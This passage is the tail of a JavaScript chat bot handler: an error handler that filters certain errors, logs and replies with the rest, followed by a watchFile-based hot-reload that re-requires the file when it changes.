if (e.includes('Timed Out')){ return }
if (e.includes('Value not found')){ return }
console.log(chalk.white('Message Error : %s'), chalk.green(util.format(e)))
m.reply(util.format(err))
}}

//================================================================================

let file = require.resolve(`${__filename}` )
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update ${__filename}`))
	delete require.cache[file]
	require(file)
});